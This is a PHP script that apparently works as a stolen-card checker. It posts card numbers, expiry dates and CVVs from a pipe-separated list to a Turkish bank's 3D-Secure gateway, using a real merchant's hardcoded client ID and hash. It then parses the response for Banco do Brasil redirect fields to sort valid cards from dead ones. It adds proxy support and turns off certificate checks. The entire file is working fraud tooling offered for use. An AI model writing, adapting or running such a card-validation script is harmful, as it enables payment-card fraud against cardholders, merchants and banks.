<?php

// error_reporting(0);
$start_time = microtime(true); 
extract($_REQUEST);

$what_3ds = False;
if (@$tds == 'on'){
	$what_3ds = True;
}

if (@$lista == ''){
	exit('Lista em branco');
}
list($cc, $mm, $yy, $cvv) = explode('|', $lista);
if (strlen($mm)==1){
	$mm = "0$mm";
}
if (strlen($yy)==2){
	$yy = "20$yy";
}
// if (strlen($yy) == 4){
//    $yy = $yy[2].$yy[3]; 
// }
$ch = curl_init();
$cid = round(microtime(true) * 1000);

$proxy = '';

$url = "https://sanalpos2.ziraatbank.com.tr/fim/est3Dgate";
$post = 'clientid=190128478&oid=09062022220747149896&amount=359.00&okUrl=https%3A%2F%2Fwww.pt.com.tr%2Fpayment%2Fest3dsucc&failUrl=https%3A%2F%2Fwww.pt.com.tr%2Fpayment%2Fest3dfail&rnd=1654801667&islemtipi=Auth&currency=949&taksit=&hash=B4eFwdnWIZkDP5GuDKTlfSvPK90%3D&storetype=3d_pay&refreshtime=0&lang=tr&firmaadi=Pozitif+Teknoloji+Tic.Ltd.%C5%9Eti&bank=18&pan='.$cc.'&cv2='.$cvv.'&Ecom_Payment_Card_ExpDate_Year='.$yy.'&Ecom_Payment_Card_ExpDate_Month='.$mm.'&cardType=VISA';
curl_setopt_array($ch, array(
	CURLOPT_URL => $url,
	CURLOPT_SSL_VERIFYPEER => false,
	CURLOPT_RETURNTRANSFER => true,
	CURLOPT_FOLLOWLOCATION => false,
	CURLOPT_POST => True,
	CURLOPT_POSTFIELDS => $post,
	CURLOPT_PROXY => $proxy,
	CURLOPT_ENCODING => '',
	CURLOPT_COOKIESESSION => 1,
	CURLOPT_COOKIEJAR => getcwd().'/cookies/'.$cid.'.txt',
	CURLOPT_COOKIEFILE => getcwd().'/cookies/'.$cid.'.txt',
	CURLOPT_HTTPHEADER => array(
		'Cache-Control: max-age=0',
		'Upgrade-Insecure-Requests: 1',
		'Origin: https://www.pt.com.tr',
		'Content-Type: application/x-www-form-urlencoded',
		'User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.0.0 Safari/537.36',
		'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
		'Referer: https://www.pt.com.tr/',
		'Accept-Language: pt-PT,pt;q=0.9,en-US;q=0.8,en;q=0.7',
		)
));
$result = curl_exec($ch);
if (strpos($result, "www58.bb.com.br") !== false || strpos($result, "www66.bb.com.br") !== false){
	if (strpos($result, 'hidden" name="PaReq" value="') !== false && strpos($result, 'hidden" name="TermUrl" value="') !== false && strpos($result, 'hidden" name="MD" value="') !== false){
		$PaReq = explode('"', explode('hidden" name="PaReq" value="', $result)[1])[0];
		$TermUrl = explode('"', explode('hidden" name="TermUrl" value="', $result)[1])[0];
		$MD = explode('"', explode('hidden" name="MD" value="', $result)[1])[0];
		include_once("bb_extra.php");
		// exit('Até aqui OK');
	} else {
		exit("RETRY;");
	}
}
exit('Cartão inexistente');